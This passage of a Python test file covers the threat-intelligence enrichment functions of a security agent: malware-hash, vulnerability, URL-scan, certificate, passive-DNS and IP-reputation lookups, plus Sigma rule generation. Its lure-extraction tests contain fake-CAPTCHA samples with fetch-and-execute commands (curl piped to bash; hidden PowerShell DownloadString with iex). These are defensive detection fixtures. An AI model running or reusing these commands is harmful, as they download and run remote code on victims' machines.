                    "multiscan_result": 92,
                    "reports": ["rep-12345"],
                }
                return mock_ov
            elif "report/rep-12345/summary" in url:
                mock_rep = MagicMock(status_code=200)
                mock_rep.json.return_value = {
                    "environment_description": "Windows 10 64-bit",
                    "mitre_attcks": [
                        {"attck_id": "T1547", "technique": "Boot or Logon Autostart Execution"},
                        {"attck_id": "T1059.001", "technique": "PowerShell"},
                    ],
                }
                return mock_rep
            return MagicMock(status_code=404)

        mock_get.side_effect = get_side_effect
        res = query_hybrid_analysis("35dd164a7f5d8b42b9870c7009f7425b1c8cb771280c9e6c525e09f3dd13c2cc")
        assert "Verdict: MALICIOUS (Score: 100/100)" in res
        assert "Family: AsyncRAT" in res
        assert "Type: peexe" in res
        assert "Multi-Scan: 92%" in res
        assert "Env: Windows 10 64-bit" in res
        assert "MITRE: T1547, T1059.001" in res


def test_query_hybrid_analysis_not_found(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_hybrid_analysis

    monkeypatch.setenv("HYBRID_ANALYSIS_API_KEY", "ha-test-key")
    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {}
        mock_get.return_value = mock_resp
        res = query_hybrid_analysis("35dd164a7f5d8b42b9870c7009f7425b1c8cb771280c9e6c525e09f3dd13c2cc")
        assert res == "No records on Hybrid Analysis."

        mock_resp_404 = MagicMock(status_code=404)
        mock_get.return_value = mock_resp_404
        assert (
            query_hybrid_analysis("35dd164a7f5d8b42b9870c7009f7425b1c8cb771280c9e6c525e09f3dd13c2cc")
            == "No records on Hybrid Analysis."
        )


def test_query_hybrid_analysis_auth_and_rate_limits(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_hybrid_analysis

    monkeypatch.setenv("HYBRID_ANALYSIS_API_KEY", "ha-test-key")
    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        mock_resp_401 = MagicMock(status_code=401)
        mock_get.return_value = mock_resp_401
        res_401 = query_hybrid_analysis("35dd164a7f5d8b42b9870c7009f7425b1c8cb771280c9e6c525e09f3dd13c2cc")
        assert "Hybrid Analysis Auth Error" in res_401

        mock_resp_429 = MagicMock(status_code=429)
        mock_get.return_value = mock_resp_429
        res_429 = query_hybrid_analysis("35dd164a7f5d8b42b9870c7009f7425b1c8cb771280c9e6c525e09f3dd13c2cc")
        assert "Hybrid Analysis rate limit exceeded." in res_429


def test_query_osv_vuln_success():
    from hecate_agent.orchestrator.enrichment import query_osv_vuln

    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "id": "CVE-2024-3094",
            "summary": "Xz: malicious code in distributed source",
            "aliases": ["GHSA-rxwq-x6h5-x525"],
            "affected": [{"package": {"name": "xz", "ecosystem": "Debian"}}],
            "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"}],
        }
        mock_get.return_value = mock_resp
        res = query_osv_vuln("CVE-2024-3094")
        assert "Advisory: Xz: malicious code in distributed source" in res
        assert "Affected: Debian:xz" in res
        assert "Aliases: GHSA-rxwq-x6h5-x525" in res
        assert "CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H" in res


def test_query_osv_vuln_details_fallback():
    from hecate_agent.orchestrator.enrichment import query_osv_vuln

    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        mock_resp = MagicMock(status_code=200)
        mock_resp.json.return_value = {
            "id": "CVE-2021-44228",
            "summary": None,
            "details": "Apache Log4j2 JNDI remote code execution vulnerability.\nMore details here...",
            "aliases": ["GHSA-jfh8-c2jp-5v3q"],
        }
        mock_get.return_value = mock_resp
        res = query_osv_vuln("CVE-2021-44228")
        assert "Advisory: Apache Log4j2 JNDI remote code execution vulnerability." in res
        assert "Aliases: GHSA-jfh8-c2jp-5v3q" in res


def test_query_osv_vuln_not_found():
    from hecate_agent.orchestrator.enrichment import query_osv_vuln

    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        mock_resp = MagicMock(status_code=404)
        mock_get.return_value = mock_resp
        assert query_osv_vuln("CVE-1990-0000") == "No open-source advisory on OSV.dev."


def test_query_osv_vuln_error():
    from hecate_agent.orchestrator.enrichment import query_osv_vuln

    with patch("hecate_agent.orchestrator.enrichment.httpx.get") as mock_get:
        mock_get.side_effect = Exception("Connection timed out")
        res = query_osv_vuln("CVE-2024-3094")
        assert "Error querying OSV.dev" in res

    assert query_osv_vuln("") == "Invalid vulnerability ID."


def test_extract_indicators_ghsa_and_osv_domains():
    text = (
        "Found exploit in requests library: GHSA-j8r2-6x86-q33q and CVE-2023-32681.\n"
        "Reference URLs: https://osv.dev/vulnerability/GHSA-j8r2-6x86-q33q and https://api.osv.dev/v1/vulns/CVE-2023-32681.\n"
        "Malicious domain is supply-chain-backdoor.xyz."
    )
    inds = extract_indicators(text)
    assert "GHSA-J8R2-6X86-Q33Q" in inds["cves"]
    assert "CVE-2023-32681" in inds["cves"]
    assert "supply-chain-backdoor.xyz" in inds["domains"]
    assert "osv.dev" not in inds["domains"]
    assert "api.osv.dev" not in inds["domains"]


def test_extract_web_lure_payloads_clipboard_bash():
    text = """
    <div class="human-check">Click Verify, then open Terminal and press Command+V.</div>
    <script>
    const cmd = "curl -s http://193.29.224.151/ulacck | bash";
    navigator.clipboard.writeText(cmd);
    </script>
    """
    lures = extract_web_lure_payloads(text)
    assert len(lures) >= 1
    assert any("curl -s http://193.29.224.151/ulacck | bash" in lure["command"] for lure in lures)
    assert any("clipboard" in lure["source"] for lure in lures)


def test_extract_web_lure_payloads_powershell_fake_captcha():
    text = """
    <div class="captcha-prompt">Verify you are human: Press Windows Key + R, then CTRL + V, then Enter.</div>
    <script>
    const payload = "powershell -w hidden -c \\"iex(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\\"";
    navigator.clipboard.writeText(payload);
    </script>
    """
    lures = extract_web_lure_payloads(text)
    assert len(lures) >= 1
    cmd = lures[0]["command"]
    assert "powershell -w hidden -c" in cmd
    assert "DownloadString" in cmd


def test_extract_web_lure_payloads_empty_or_benign():
    assert extract_web_lure_payloads("") == []
    assert extract_web_lure_payloads("<html><body>Normal blog text without any scripts</body></html>") == []


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_urlscan_url_malicious_with_lure(mock_get):
    _URLSCAN_CACHE.clear()
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "results": [
            {
                "verdicts": {
                    "overall": {
                        "malicious": True,
                        "score": 100,
                        "tags": ["phishing", "clickfix"],
                        "brands": ["Cloudflare", "Apple"],
                    }
                },
                "page": {
                    "url": "https://verify-captcha-cloudflare.com/",
                    "domain": "verify-captcha-cloudflare.com",
                    "ip": "193.29.224.151",
                    "asn": "AS210644",
                    "asnname": "AEZA INTERNATIONAL LTD",
                    "country": "RU",
                    "title": "Cloudflare Human Verification - Verify you are human",
                },
                "result": "https://urlscan.io/result/12345-abc/",
            }
        ],
        "total": 1,
    }
    mock_get.return_value = mock_resp

    res = query_urlscan_url("https://verify-captcha-cloudflare.com/")
    assert "Status: Malicious (Score: 100/100)" in res
    assert "Tags: phishing, clickfix" in res
    assert "Target Brand: Cloudflare, Apple" in res
    assert "AS210644 AEZA INTERNATIONAL LTD" in res
    assert "193.29.224.151" in res
    assert "https://urlscan.io/result/12345-abc/" in res


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_urlscan_url_benign(mock_get):
    _URLSCAN_CACHE.clear()
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "results": [
            {
                "verdicts": {
                    "overall": {
                        "malicious": False,
                        "score": 0,
                        "tags": [],
                        "brands": [],
                    }
                },
                "page": {
                    "url": "https://example.com/",
                    "domain": "example.com",
                    "ip": "93.184.216.34",
                    "asn": "AS15133",
                    "asnname": "EDGECAST",
                    "country": "US",
                    "title": "Example Domain",
                },
                "result": "https://urlscan.io/result/example-123/",
            }
        ],
        "total": 1,
    }
    mock_get.return_value = mock_resp

    res = query_urlscan_url("https://example.com/")
    assert "Status: Benign/Neutral (Score: 0/100)" in res
    assert "Host: 93.184.216.34 | AS15133 EDGECAST | US" in res
    assert "Title: Example Domain" in res


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_urlscan_url_not_indexed(mock_get):
    _URLSCAN_CACHE.clear()
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {"results": [], "total": 0}
    mock_get.return_value = mock_resp

    res = query_urlscan_url("https://unseen-domain.xyz/")
    assert res == "Not indexed on URLScan.io."


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_urlscan_cache(mock_get):
    _URLSCAN_CACHE.clear()
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {"results": [], "total": 0}
    mock_get.return_value = mock_resp

    res1 = query_urlscan_url("https://cached-test.com/")
    res2 = query_urlscan_url("https://cached-test.com/")
    assert res1 == res2 == "Not indexed on URLScan.io."
    assert mock_get.call_count == 1  # 2nd call served from cache


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_urlscan_domain_success(mock_get):
    _URLSCAN_CACHE.clear()
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "results": [
            {
                "verdicts": {
                    "overall": {
                        "malicious": True,
                        "score": 85,
                        "tags": ["stealer", "lure"],
                        "brands": ["Google"],
                    }
                },
                "page": {
                    "domain": "fake-lure-portal.top",
                    "ip": "45.154.255.10",
                    "asn": "AS210644",
                    "asnname": "AEZA",
                    "country": "RU",
                    "title": "Google Drive Share Verification",
                },
                "result": "https://urlscan.io/result/portal-999/",
            }
        ],
        "total": 1,
    }
    mock_get.return_value = mock_resp

    res = query_urlscan_domain("fake-lure-portal.top")
    assert "Status: Malicious (Score: 85/100)" in res
    assert "Target Brand: Google" in res
    assert "AS210644 AEZA" in res


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_urlscan_rate_limits_and_errors(mock_get):
    _URLSCAN_CACHE.clear()

    # Rate limit 429
    mock_429 = MagicMock()
    mock_429.status_code = 429
    mock_get.return_value = mock_429
    res_429 = query_urlscan_url("https://rate-limited.com/")
    assert "rate limit exceeded" in res_429

    _URLSCAN_CACHE.clear()
    # Auth error 401
    mock_401 = MagicMock()
    mock_401.status_code = 401
    mock_get.return_value = mock_401
    res_401 = query_urlscan_url("https://auth-err.com/")
    assert "Auth Error" in res_401

    _URLSCAN_CACHE.clear()
    # Connection error
    mock_get.side_effect = Exception("Connection timeout")
    res_err = query_urlscan_domain("timeout-domain.com")
    assert "Error querying URLScan.io" in res_err


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_extract_sibling_domains_from_crtsh_success(mock_get):
    _CRTSH_CACHE.clear()
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.headers = {"content-type": "application/json"}
    mock_resp.json.return_value = [
        {
            "issuer_name": "C=US, O=Let's Encrypt, CN=R3",
            "common_name": "lure-01.apple-cloud-support.com",
            "name_value": "lure-01.apple-cloud-support.com\nstaging.apple-cloud-support.com\n*.apple-cloud-support.com\nc2.apple-cloud-support.com",
            "entry_timestamp": "2026-10-15T08:30:00",
            "not_before": "2026-10-15T07:30:00",
        },
        {
            "issuer_name": "C=US, O=Let's Encrypt, CN=R3",
            "common_name": "download.apple-cloud-support.com",
            "name_value": "download.apple-cloud-support.com",
            "entry_timestamp": "2026-10-16T10:15:00",
            "not_before": "2026-10-16T09:15:00",
        },
    ]
    mock_get.return_value = mock_resp

    siblings = extract_sibling_domains_from_crtsh("lure-01.apple-cloud-support.com")
    assert "apple-cloud-support.com" in siblings
    assert "c2.apple-cloud-support.com" in siblings
    assert "download.apple-cloud-support.com" in siblings
    assert "staging.apple-cloud-support.com" in siblings
    assert "lure-01.apple-cloud-support.com" not in siblings  # Queried domain is filtered out


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_extract_sibling_domains_from_crtsh_shared_hosting(mock_get):
    _CRTSH_CACHE.clear()
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.headers = {"content-type": "application/json"}
    mock_resp.json.return_value = []
    mock_get.return_value = mock_resp

    extract_sibling_domains_from_crtsh("phish-target.pages.dev")
    # Verify it queries the exact subdomain rather than wildcard %.pages.dev
    assert mock_get.call_args[1]["params"]["q"] == "phish-target.pages.dev"


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_crtsh_domain_formatting_and_cache(mock_get):
    _CRTSH_CACHE.clear()
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.headers = {"content-type": "application/json"}
    mock_resp.json.return_value = [
        {
            "issuer_name": "C=US, O=ZeroSSL, CN=ZeroSSL RSA Domain Secure Site CA",
            "common_name": "login.crypto-wallet-verify.top",
            "name_value": "login.crypto-wallet-verify.top\nc2-gateway.crypto-wallet-verify.top\nauth.crypto-wallet-verify.top",
            "entry_timestamp": "2026-10-18T12:00:00",
            "not_before": "2026-10-18T11:00:00",
        }
    ]
    mock_get.return_value = mock_resp

    res1 = query_crtsh_domain("login.crypto-wallet-verify.top")
    assert "Certificates: 1 logged" in res1
    assert "ZeroSSL" in res1
    assert "Latest: 2026-10-18" in res1
    assert "Sibling Domains (2):" in res1
    assert "c2-gateway.crypto-wallet-verify.top" in res1

    # Cached call
    res2 = query_crtsh_domain("login.crypto-wallet-verify.top")
    assert res1 == res2
    assert mock_get.call_count == 1  # 2nd call was served from cache


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
def test_query_crtsh_domain_empty_and_errors(mock_get):
    _CRTSH_CACHE.clear()
    mock_empty = MagicMock()
    mock_empty.status_code = 200
    mock_empty.headers = {"content-type": "application/json"}
    mock_empty.json.return_value = []
    mock_get.return_value = mock_empty

    res_empty = query_crtsh_domain("no-certs-domain.org")
    assert res_empty == "No certificates found on crt.sh."

    _CRTSH_CACHE.clear()
    # Rate limit 429
    mock_429 = MagicMock()
    mock_429.status_code = 429
    mock_get.return_value = mock_429
    res_429 = query_crtsh_domain("busy-domain.org")
    assert "rate limit exceeded" in res_429

    _CRTSH_CACHE.clear()
    # Timeout / exception
    mock_get.side_effect = Exception("Connection timed out")
    res_err = query_crtsh_domain("timeout-domain.org")
    assert "Error querying crt.sh" in res_err


def test_submit_urlscan_detonation_no_key():
    with patch("hecate_agent.orchestrator.enrichment._setting", return_value=""):
        res = submit_urlscan_detonation("https://fake-captcha-login.xyz")
        assert res["status"] == "error"
        assert "API key required" in res["message"]


@patch("hecate_agent.orchestrator.enrichment.httpx.post")
def test_submit_urlscan_detonation_success_and_rate_limit(mock_post):
    with patch("hecate_agent.orchestrator.enrichment._setting", return_value="dummy-key-123"):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "message": "Submission successful",
            "uuid": "8a7c2b01-52f1-4a8d-b42e-1e9a37bcde81",
            "result": "https://urlscan.io/result/8a7c2b01-52f1-4a8d-b42e-1e9a37bcde81/",
            "api": "https://urlscan.io/api/v1/result/8a7c2b01-52f1-4a8d-b42e-1e9a37bcde81/",
        }
        mock_post.return_value = mock_resp

        res = submit_urlscan_detonation("https://lure.phish-site.cc")
        assert res["status"] == "submitted"
        assert res["uuid"] == "8a7c2b01-52f1-4a8d-b42e-1e9a37bcde81"
        assert "8a7c2b01" in res["result"]

        # Rate limited response
        mock_resp_429 = MagicMock()
        mock_resp_429.status_code = 429
        mock_post.return_value = mock_resp_429
        res_429 = submit_urlscan_detonation("https://lure2.phish-site.cc")
        assert res_429["status"] == "rate_limited"


@patch("hecate_agent.orchestrator.enrichment.httpx.get")
@patch("hecate_agent.orchestrator.enrichment.time.sleep")
def test_poll_urlscan_result_flow(mock_sleep, mock_get):
    # Simulates: 1st attempt 404 (in progress), 2nd attempt 200 (completed)
    resp_pending = MagicMock()
    resp_pending.status_code = 404

    resp_ready = MagicMock()
    resp_ready.status_code = 200
    resp_ready.json.return_value = {
        "page": {"url": "https://fake-captcha.cc"},
        "data": {"requests": []},
    }

    mock_get.side_effect = [resp_pending, resp_ready]

    result = poll_urlscan_result("8a7c2b01-52f1-4a8d-b42e-1e9a37bcde81", max_wait_seconds=10.0, poll_interval=0.1)
    assert result["status"] == "ready"
    assert "page" in result
    assert mock_get.call_count == 2
    assert mock_sleep.call_count == 1


def test_extract_http_transactions_and_payload_detection():
    sample_scan = {
        "data": {
            "requests": [
                {
                    "request": {
                        "request": {
                            "url": "https://update-browser-now.top/verify.html",
                            "method": "GET",
                            "headers": {"User-Agent": "Mozilla/5.0"},
                        }
                    },
                    "response": {
                        "response": {
                            "status": 200,
                            "mimeType": "text/html",
                            "remoteIPAddress": "185.220.101.5",
                            "remotePort": 443,
                        }
                    },
                },
                {
                    "request": {
                        "request": {
                            "url": "https://cdn.update-browser-now.top/payloads/ChromeSetup.dmg",
                            "method": "GET",
                            "headers": {"User-Agent": "Mozilla/5.0"},
                        }
                    },
                    "response": {
                        "response": {
                            "status": 200,
                            "mimeType": "application/x-apple-diskimage",
                            "remoteIPAddress": "194.26.29.112",
                            "remotePort": 8443,
                        }
                    },
                },
            ]
        }
    }

    txs = extract_http_transactions(sample_scan)
    assert len(txs) == 2

    tx_page, tx_payload = txs[0], txs[1]
    assert tx_page["host"] == "update-browser-now.top"
    assert tx_page["path"] == "/verify.html"
    assert not tx_page["is_payload"]

    assert tx_payload["host"] == "cdn.update-browser-now.top"
    assert tx_payload["path"] == "/payloads/ChromeSetup.dmg"
    assert tx_payload["remote_ip"] == "194.26.29.112"
    assert tx_payload["remote_port"] == 8443
    assert tx_payload["is_payload"] is True


def test_generate_transaction_sigma_rules():
    transactions = [
        {
            "url": "https://stealer-drop.com/stager/payload.exe",
            "method": "GET",
            "host": "stealer-drop.com",
            "path": "/stager/payload.exe",
            "status": 200,
            "mime_type": "application/x-msdownload",
            "remote_ip": "45.142.214.88",
            "remote_port": 8080,
            "headers": {},
            "is_payload": True,
        }
    ]

    rules = generate_transaction_sigma_rules(transactions, hunt_id="H-9999", title_prefix="ClickFix Detonation")
    assert len(rules) == 2

    proxy_rule = next(r for r in rules if r["logsource"]["category"] == "proxy")
    net_rule = next(r for r in rules if r["logsource"]["category"] == "network_connection")

    # Proxy rule assertions
    assert "ClickFix Detonation - Web Proxy" in proxy_rule["title"]
    assert proxy_rule["hunt_id"] == "H-9999"
    assert proxy_rule["detection"]["selection"]["cs-host"] == "stealer-drop.com"
    assert ".exe" in proxy_rule["detection"]["selection"]["c-uri-stem|endswith"]
    assert "rule_yaml" in proxy_rule
    assert "category: proxy" in proxy_rule["rule_yaml"]

    # Network connection rule assertions
    assert "ClickFix Detonation - Outbound" in net_rule["title"]
    assert net_rule["hunt_id"] == "H-9999"
    assert net_rule["detection"]["selection"]["DestinationIp"] == "45.142.214.88"
    assert net_rule["detection"]["selection"]["DestinationPort"] == 8080
    assert "category: network_connection" in net_rule["rule_yaml"]


def test_spur_ip_unset_key():
    _SPUR_CACHE.clear()
    with patch("hecate_agent.orchestrator.enrichment._setting", return_value=""):
        res = query_spur_ip("8.8.8.8")
        assert res == "SPUR_API_KEY not configured."
        raw = extract_spur_context("8.8.8.8")
        assert raw["configured"] is False
        assert "not configured" in raw["error"]


def test_spur_ip_private_and_invalid():
    with patch("hecate_agent.orchestrator.enrichment._setting", return_value="test_key"):
        assert query_spur_ip("192.168.1.50") == "Private/internal IP address."
        assert query_spur_ip("10.0.0.1") == "Private/internal IP address."
        assert query_spur_ip("127.0.0.1") == "Private/internal IP address."
        assert "Invalid IP address" in query_spur_ip("999.999.999.999")
        assert "Invalid IP address" in query_spur_ip("not-an-ip")


def test_spur_ip_parsing_residential_proxy():
    _SPUR_CACHE.clear()
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "as": {"number": 7922, "organization": "Comcast Cable Communications, LLC"},
        "infrastructure": "RESIDENTIAL",
        "client": {"proxies": ["NSOCKS", "PROXY-CHEAP"], "types": ["RESIDENTIAL", "DESKTOP"]},
        "tunnels": [{"operator": "PROTON_VPN", "anonymous": True, "type": "VPN"}],
        "risks": ["CALLBACK_PROXY", "TUNNEL", "GEO_MISMATCH"],
        "location": {"city": "Philadelphia", "country": "US"},
    }

    with (
        patch("hecate_agent.orchestrator.enrichment._setting", return_value="test_key"),
        patch("httpx.get", return_value=mock_resp),
    ):
        res = query_spur_ip("139.180.203.104")
        assert "Infra: RESIDENTIAL" in res
        assert "AS: AS7922 (Comcast Cable Communications, LLC)" in res
        assert "Tunnels: PROTON_VPN (Anonymous)" in res
        assert "Proxies: NSOCKS, PROXY-CHEAP" in res
        assert "Risks: CALLBACK_PROXY, TUNNEL, GEO_MISMATCH" in res
        assert "Loc: Philadelphia, US" in res

        raw = extract_spur_context("139.180.203.104")
        assert raw["configured"] is True
        assert raw["infrastructure"] == "RESIDENTIAL"


def test_spur_ip_caching():
    _SPUR_CACHE.clear()
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "as": {"number": 15169, "organization": "Google LLC"},
        "infrastructure": "DATACENTER",
        "location": {"city": "Mountain View", "country": "US"},
    }

    with (
        patch("hecate_agent.orchestrator.enrichment._setting", return_value="test_key"),
        patch("httpx.get", return_value=mock_resp) as mock_get,
    ):
        res1 = query_spur_ip("8.8.8.8")
        res2 = query_spur_ip("8.8.8.8")
        assert res1 == res2
        assert mock_get.call_count == 1


def test_spur_ip_errors_and_fallbacks():
    _SPUR_CACHE.clear()
    with patch("hecate_agent.orchestrator.enrichment._setting", return_value="test_key"):
        r404 = MagicMock(status_code=404)
        with patch("httpx.get", return_value=r404):
            _SPUR_CACHE.clear()
            assert query_spur_ip("1.1.1.1") == "Not observed on Spur."

        r401 = MagicMock(status_code=401)
        with patch("httpx.get", return_value=r401):
            _SPUR_CACHE.clear()
            assert "Spur Auth Error" in query_spur_ip("1.1.1.1")

        r429 = MagicMock(status_code=429)
        with patch("httpx.get", return_value=r429):
            _SPUR_CACHE.clear()
            assert "rate limit exceeded" in query_spur_ip("1.1.1.1")


def test_passive_dns_timestamp_and_date_helpers():
    assert _normalize_pdns_timestamp(1661150948) == 1661150948
    assert _format_pdns_date(1661150948) == "2022-08"

    assert _normalize_pdns_timestamp(1664846708636) == 1664846708
    assert _format_pdns_date(1664846708) == "2022-10"

    ts = _normalize_pdns_timestamp("2022-08-22T04:09:08")
    assert ts is not None
    assert _format_pdns_date(ts) == "2022-08"

    assert _normalize_pdns_timestamp(None) is None
    assert _format_pdns_date(None) == ""


def test_query_passive_dns_ip_aggregation_and_deduplication():
    _PDNS_CACHE.clear()

    mock_vt_resp = MagicMock()
    mock_vt_resp.status_code = 200
    mock_vt_resp.json.return_value = {
        "data": [
            {"attributes": {"host_name": "addio1987.com", "date": 1661138909}},
            {"attributes": {"host_name": "www.addio1987.com", "date": 1661150948}},
        ]
    }

    mock_mn_resp = MagicMock()
    mock_mn_resp.status_code = 200
    mock_mn_resp.json.return_value = {
        "data": [
            {"query": "addio1987.com", "lastSeenTimestamp": 1664846708636},
            {"query": "microsoft.systemservices.network", "lastSeenTimestamp": 1600441094000},
        ]
    }

    mock_otx_resp = MagicMock()
    mock_otx_resp.status_code = 200
    mock_otx_resp.json.return_value = {
        "passive_dns": [
            {"hostname": "kugua.ooo", "last": "2019-10-15T00:00:00"},
        ]
    }

    def fake_get(url, *args, **kwargs):
        if "virustotal.com" in url:
            return mock_vt_resp
        elif "mnemonic.no" in url:
            return mock_mn_resp
        elif "alienvault.com" in url:
            return mock_otx_resp
        return MagicMock(status_code=404)

    with (
        patch("hecate_agent.orchestrator.enrichment._setting", side_effect=lambda k, d="": "dummy_key" if "KEY" in k else d),
        patch("httpx.get", side_effect=fake_get),
    ):
        res = query_passive_dns("139.180.203.104")
        assert "Passive DNS:" in res
        assert "addio1987.com" in res
        assert "www.addio1987.com" in res
        assert "microsoft.systemservices.network" in res
        assert "kugua.ooo" in res
        assert "via Mnemonic" in res or "via VT" in res


def test_query_passive_dns_domain_aggregation():
    _PDNS_CACHE.clear()

    mock_vt_resp = MagicMock()
    mock_vt_resp.status_code = 200
    mock_vt_resp.json.return_value = {
        "data": [
            {"attributes": {"ip_address": "104.21.54.21", "date": 1776684591}},
            {"attributes": {"ip_address": "172.67.222.132", "date": 1776684591}},
        ]
    }

    mock_mn_resp = MagicMock()
    mock_mn_resp.status_code = 200
    mock_mn_resp.json.return_value = {
        "data": [
            {"answer": "199.59.243.225", "lastSeenTimestamp": 1713265577007},
        ]
    }

    def fake_get(url, *args, **kwargs):
        if "virustotal.com" in url:
            return mock_vt_resp
        elif "mnemonic.no" in url:
            return mock_mn_resp
        return MagicMock(status_code=404)

    with (
        patch("hecate_agent.orchestrator.enrichment._setting", side_effect=lambda k, d="": "dummy_key" if "KEY" in k else d),
        patch("httpx.get", side_effect=fake_get),
    ):
        res = query_passive_dns_domain("drivinguber.com")
        assert "Passive DNS:" in res
        assert "104.21.54.21" in res
        assert "172.67.222.132" in res
        assert "199.59.243.225" in res


def test_generate_enrichment_summary_includes_spur_and_pdns():
    _SPUR_CACHE.clear()
    _PDNS_CACHE.clear()

    threat_intel = "The adversary operated from IP 45.142.214.88 and domain evil-landing.org"

    with (
        patch(
            "hecate_agent.orchestrator.enrichment.query_spur_ip",
            return_value="Infra: RESIDENTIAL | Tunnels: ProtonVPN (Anonymous)",
        ),
        patch(
            "hecate_agent.orchestrator.enrichment.query_passive_dns",
            return_value="Passive DNS: sibling.evil-landing.org (2026-10) [via Mnemonic]",
        ),
    ):
        summary = generate_enrichment_summary(threat_intel)
        assert "Spur.us (Proxy & Infrastructure):" in summary
        assert "Infra: RESIDENTIAL" in summary
        assert "Passive DNS (Historical Correlated Hostnames):" in summary
        assert "Passive DNS (Historical IP Resolutions):" in summary


def test_tor_exit_node_parsing_and_lookup():
    _TOR_EXIT_CACHE["data"] = set()
    _TOR_EXIT_CACHE["ts"] = 0.0

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.text = "# Tor exit list\n171.25.193.25\n80.67.167.81\n109.70.100.4\n"

    with patch("httpx.get", return_value=mock_resp):
        nodes = _get_tor_exit_nodes()
        assert len(nodes) == 3
        assert "171.25.193.25" in nodes
        assert "80.67.167.81" in nodes
        assert "1.1.1.1" not in nodes

        assert is_tor_exit_node("171.25.193.25") is True
        assert is_tor_exit_node("1.1.1.1") is False

        assert "Confirmed Active Exit Node" in query_tor_exit("171.25.193.25")
        assert "Not a Tor exit node" in query_tor_exit("1.1.1.1")


def test_ipinfo_parsing_and_classification():
    _IPINFO_CACHE.clear()

    # Test private IP handling
    assert query_ipinfo_ip("192.168.1.1") == "Private/internal IP address."
    raw_priv = extract_ipinfo_context("10.0.0.1")
    assert raw_priv.get("bogon") is True

    # Test hosting/VPN detection
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "ip": "185.220.101.5",
        "hostname": "tor-exit-01.relays.net",
        "city": "Frankfurt",
        "region": "Hesse",
        "country": "DE",
        "org": "AS24940 Hetzner Online GmbH",
        "anycast": False,
        "privacy": {
            "vpn": True,
            "proxy": False,
            "tor": True,
            "hosting": True,
            "service": "Mullvad",
        },
        "company": {"type": "hosting"},
    }

    with patch("httpx.get", return_value=mock_resp):
        res = query_ipinfo_ip("185.220.101.5")
        assert "Classification: Tor, VPN (Mullvad), Hosting/Datacenter" in res
        assert "Org: AS24940 Hetzner Online GmbH" in res
        assert "Host: tor-exit-01.relays.net" in res
        assert "Loc: Frankfurt, Hesse, DE" in res

        raw = extract_ipinfo_context("185.220.101.5")
        assert raw["configured"] is True
        assert raw["privacy"]["vpn"] is True


def test_query_anonymity_proxy_ip_unified():
    _TOR_EXIT_CACHE["data"] = {"171.25.193.25"}
    _TOR_EXIT_CACHE["ts"] = 9999999999.0
    _IPINFO_CACHE.clear()

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "ip": "171.25.193.25",
        "hostname": "tor-node.dfri.se",
        "city": "Stockholm",
        "country": "SE",
        "org": "AS198093 DFRI",
    }

    with patch("httpx.get", return_value=mock_resp):
        res = query_anonymity_proxy_ip("171.25.193.25")
        assert "Tor Exit Node (Active)" in res
        assert "Org: AS198093 DFRI" in res
        assert "Host: tor-node.dfri.se" in res
        assert "via IPinfo" in res or "Tor Project" in res


def test_generate_enrichment_summary_includes_anonymity_proxy():
    _TOR_EXIT_CACHE["data"] = set()
    _IPINFO_CACHE.clear()

    threat_intel = "The attacker used IP 185.220.101.5 for staging."

    with patch(
        "hecate_agent.orchestrator.enrichment.query_anonymity_proxy_ip",
        return_value="Tor Exit Node (Active) | Org: AS24940 [IPinfo, Tor Project]",
    ):
        summary = generate_enrichment_summary(threat_intel)
        assert "Anonymity & Proxy (Tor / Hosting / VPN):" in summary
        assert "Tor Exit Node (Active)" in summary
        assert "Org: AS24940" in summary


def test_query_triage_hash_no_key(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_triage_hash

    monkeypatch.delenv("TRIAGE_API_KEY", raising=False)
    monkeypatch.delenv("HATCHING_TRIAGE_KEY", raising=False)
    monkeypatch.delenv("TRIA_GE_API_KEY", raising=False)

    res = query_triage_hash("44d88612fea8a8f36de82e1278abb02f")
    assert res == "TRIAGE_API_KEY not configured."


def test_query_triage_hash_invalid_hash(monkeypatch):
    from hecate_agent.orchestrator.enrichment import query_triage_hash

    monkeypatch.setenv("TRIAGE_API_KEY", "fake_key_123")
    res = query_triage_hash("not_a_valid_hash")
    assert "Invalid hash format" in res


